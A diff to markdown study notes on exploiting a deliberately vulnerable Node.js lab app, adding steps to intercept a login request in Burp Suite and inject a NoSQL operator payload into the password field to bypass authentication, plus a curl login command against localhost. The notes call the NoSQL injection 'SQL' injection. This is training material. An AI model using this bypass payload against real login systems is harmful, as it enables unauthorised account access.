@@ -47,6 +47,34 @@
 
 ## 3. Exploiting common vulnerabilities
 
-<!-- video 19:04 -->
+### Intercepting HTTP Request and Injecting SQL
 
-https://github.com/snyk-labs/nodejs-goof
+1. Download Burp Suite: https://portswigger.net/burp/releases/professional-community-2025-4-4
+2. Spin up the browser inside Burp Suite
+3. Intercept HTTP requests
+4. Modify the request:
+
+```json
+// change to json -> we will inject SQL here
+Content-Type: application/json
+Accept: application/json, */*;q=0.5
+
+// injecting sql
+{
+"username":"admin@snyk.io",
+	"password": {"$gt": ""}
+ }
+```
+
+5. Then forward the request
+
+### Using CURL
+
+- CURL: Command-line utility for transferring data to or from a server
+  ![alt text](image-2.png)
+
+- Logging and getting the credentials
+
+```bash
+curl -X "POST" --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username":"admin@snyk.io", "password":"SuperSecretPassword"}' 'http://localhost:3001/login'
+```
